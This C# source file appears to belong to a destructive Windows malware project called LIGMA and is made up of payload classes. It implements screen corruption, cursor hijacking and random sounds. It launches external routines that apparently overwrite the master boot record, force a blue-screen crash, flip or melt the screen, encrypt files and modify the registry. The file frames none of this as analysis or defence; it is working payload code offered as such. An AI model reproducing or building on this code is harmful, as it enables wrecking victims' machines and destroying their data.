using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace LIGMA {

    class ImportPayloads {

        [DllImport("User32.dll")]
        public static extern IntPtr GetDC(IntPtr hwnd);

        static Random random_ = new Random();

        public static void RandomSounds() {

            while (true) {

                if (random_.Next(100) > 70) {

                    switch (random_.Next(5)) {

                        case 0:
                            SystemSounds.Asterisk.Play();
                            break;
                        case 1:
                            SystemSounds.Beep.Play();
                            break;
                        case 2:
                            SystemSounds.Exclamation.Play();
                            break;
                        case 3:
                            SystemSounds.Hand.Play();
                            break;
                        case 4:
                            SystemSounds.Question.Play();
                            break;
                    }
                }
                Thread.Sleep(400);
            }
        }

        public static void RandomCursorMovement() {

            int moveX = 0;
            int moveY = 0;

            while (true) {

                moveX = random_.Next(20) - 10;
                moveY = random_.Next(20) - 10;

                Cursor.Position = new System.Drawing.Point(Cursor.Position.X + moveX, Cursor.Position.Y + moveY);
                Thread.Sleep(50);

            }
        }

        public static void ErrorBounce() {

            IntPtr HDC = GetDC(IntPtr.Zero);
            Graphics image1 = Graphics.FromHdc(HDC);
            Bitmap Resource = new Bitmap(Properties.Resources.error);
            Point Location = new Point();
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            bool LocXStat = true;
            bool LocYStat = true;
            int div = 3;
            while (true) {

                image1.DrawImage(Resource, Location.X, Location.Y);

                if (LocXStat) {

                    if (Location.X >= x - (Resource.Width / div))
                        LocXStat = false;
                    Location.X += (Resource.Width / div) / 2;
                }

                else {

                    if (Location.X <= 0)
                        LocXStat = true;
                    Location.X -= (Resource.Width / div) / 2;
                }

                if (LocYStat) {

                    if (Location.Y >= y - (Resource.Height / div))
                        LocYStat = false;
                    Location.Y += (Resource.Height / div) / 2;
                }

                else {

                    if (Location.Y <= 0)
                        LocYStat = true;
                    Location.Y -= (Resource.Height / div) / 2;
                }
                Thread.Sleep(25);
            }
        }

        public static void DrawColorBars() {

            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            while (true) {

                IntPtr hDC = GetDC(IntPtr.Zero);
                Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
                Graphics image1 = Graphics.FromImage(bitmap);
                image1.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                image1 = Graphics.FromHdc(hDC);
                for (int bx = 0; bx < bitmap.Width; bx++) {

                    for (int by = 0; by < bitmap.Height; by += 2) {

                        Random Rand = new Random();
                        bitmap.SetPixel(bx, by, Color.FromArgb(Rand.Next(255), Rand.Next(255), Rand.Next(255), Rand.Next(255)));
                    }

                }
                image1.DrawImage(bitmap, 0, 0);
            }
        }

        public static void SolitaireCards() {

            int screenWidth = Screen.PrimaryScreen.Bounds.Width;
            int screenHeight = Screen.PrimaryScreen.Bounds.Height;
            IntPtr desktopDC = GetDC(IntPtr.Zero);
            Graphics image1 = Graphics.FromHdc(desktopDC);
            Bitmap cardBMP = new Bitmap(Properties.Resources.Card);
            long cardXPos = 0;
            long cardYPos = 0;
            int maxWallBounces = 5;
            int cardEnegy = 1;
            int cardMomentum = random_.Next(4, 5);
            bool isFalling = true;
            bool moveForward = true;
            int bounceDamping = 1;
            int numWallBounces = 0;

            while (true) {

                Thread.Sleep(1);

                if (moveForward) {

                    cardXPos += cardMomentum * 2;
                }

                else {

                    cardXPos -= cardMomentum * 2;
                }

                if (isFalling) {

                    cardEnegy += 1;
                    cardYPos += cardEnegy;
                }

                else {

                    cardEnegy -= bounceDamping;
                    cardYPos -= cardEnegy;
                }

                if (cardYPos >= (screenHeight - cardBMP.Height)) {

                    isFalling = false;
                }

                if (cardEnegy <= 0) {

                    isFalling = true;
                }

                if (cardXPos >= screenWidth - cardBMP.Width) {

                    moveForward = false;
                    numWallBounces++;
                }

                if (cardXPos <= 0) {

                    moveForward = true;
                    numWallBounces++;
                }

                if (numWallBounces >= maxWallBounces) {
                    cardXPos = 0;
                    cardYPos = 0;
                    cardEnegy = 1;
                    numWallBounces = 0;
                    isFalling = true;
                    cardMomentum = random_.Next(1, 10);
                    maxWallBounces = cardMomentum;
                }

                image1.DrawImage(cardBMP, cardXPos, cardYPos);
            }
        }
    }

    class MBR : ImportPayloads {

        [DllImport(@"C:\WinWOW32\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?mbr@Payloads@1@QAEXXZ")]
        public static extern void mbr();

        public static void Start() {

            new Thread(new ThreadStart(mbr)).Start();

        }
    }

    class FORCEBSOD : ImportPayloads {

        [DllImport(@"C:\WinWOW32\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?forcebsod@Payloads@1@QAEXXZ")]
        public static extern void forcebsod();

        public static void Start() {

            new Thread(new ThreadStart(forcebsod)).Start();

        }
    }

    class CHANGEALLTEXT : ImportPayloads {

        [DllImport(@"C:\WinWOW32\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?ChangeAllText@Payloads@1@QAEXXZ")]
        public static extern void ChangeAllText();

        public static void Start() {

            new Thread(new ThreadStart(ChangeAllText)).Start();

        } 
    }

    class SHOWALLWINDOWS : ImportPayloads {

        [DllImport(@"C:\WinWOW32\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?ShowAllWindows@Payloads@1@QAEXXZ")]
        public static extern void ShowAllWindows();

        public static void Start() {

            new Thread(new ThreadStart(ShowAllWindows)).Start();

        }
    }

    class FLIPSCREEN : ImportPayloads {

        [DllImport(@"C:\WinWOW32\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?FlipScreen@Payloads@1@QAEXXZ")]
        public static extern void FlipScreen();

        public static void Start() {

            new Thread(new ThreadStart(FlipScreen)).Start();

        }
    }

    class INVERTSCREEN : ImportPayloads {

        [DllImport(@"C:\WinWOW32\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?InvertScreen@Payloads@1@QAEXXZ")]
        public static extern void InvertScreen();

        public static void Start() {

            new Thread(new ThreadStart(InvertScreen)).Start();

        }
    }

    class MELTSCREEN : ImportPayloads {

        [DllImport(@"C:\WinWOW32\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?MeltScreen@Payloads@1@QAEXXZ")]
        public static extern void MeltScreen();

        public static void Start() {

            new Thread(new ThreadStart(MeltScreen)).Start();

        }
    }

    class MOVESCREEN : ImportPayloads {

        [DllImport(@"C:\WinWOW32\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?MoveScreen@Payloads@1@QAEXXZ")]
        public static extern void MoveScreen();


        public static void Start() {

            new Thread(new ThreadStart(MoveScreen)).Start();

        }
    }

    class SCREENGLITCHES : ImportPayloads
    {
        [DllImport(@"C:\WinWOW32\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?ScreenGlitches@Payloads@1@QAEXXZ")]
        public static extern void ScreenGlitches();

        public static void Start() {

            new Thread(new ThreadStart(ScreenGlitches)).Start();

        }
    }

    class DRAWICONS : ImportPayloads {

        [DllImport(@"C:\WinWOW32\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?DrawIcons@Payloads@1@QAEXXZ")]
        public static extern void DrawIcons();

        public static void Start() {

            new Thread(new ThreadStart(DrawIcons)).Start();

        }
    }

    class RANDOMICONS : ImportPayloads {

        [DllImport(@"C:\WinWOW32\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?RandomIcons@Payloads@1@QAEXXZ")]
        public static extern void RandomIcons();

        public static void Start() {

            new Thread(new ThreadStart(RandomIcons)).Start();

        }
    }

    class MOVEDOWN : ImportPayloads {

        [DllImport(@"C:\WinWOW32\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?MoveDown@Payloads@1@QAEXXZ")]
        public static extern void MoveDown();

        public static void Start() {

            new Thread(new ThreadStart(MoveDown)).Start();

        }
    }

    class FASTTUNNEL : ImportPayloads {

        [DllImport(@"C:\WinWOW32\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?FastTunnel@Payloads@1@QAEXXZ")]
        public static extern void FastTunnel();

        public static void Start() {

            new Thread(new ThreadStart(FastTunnel)).Start();

        }
    }

    class COLORBARS : ImportPayloads {

        public static void Start() {

            new Thread(new ThreadStart(ImportPayloads.DrawColorBars)).Start();

        }
    }

    class FILEENCRYPTION : ImportPayloads {

        public static void Start() {

            new Thread(new ThreadStart(FileEncryption.EncryptFiles)).Start();

        }
    }

    class SOLITAIRECARDS : ImportPayloads {

        public static void Start() {

            new Thread(new ThreadStart(ImportPayloads.SolitaireCards)).Start();

        }
    }

    class ERRORBOUNCE : ImportPayloads {

        public static void Start() {

            new Thread(new ThreadStart(ImportPayloads.ErrorBounce)).Start();

        }
    }

    class RANDOMSOUNDS : ImportPayloads {

        public static void Start() {

            new Thread(new ThreadStart(ImportPayloads.RandomSounds)).Start();

        }
    }

    class RANDOMCURSORMOVEMENT : ImportPayloads {

        public static void Start() {

            new Thread(new ThreadStart(ImportPayloads.RandomCursorMovement)).Start();

        }
    }

    class REGISTRY : ImportPayloads {


        public static void Edit() {

            RegistryModifications.MainRegistryModifications();

        }
    }
}
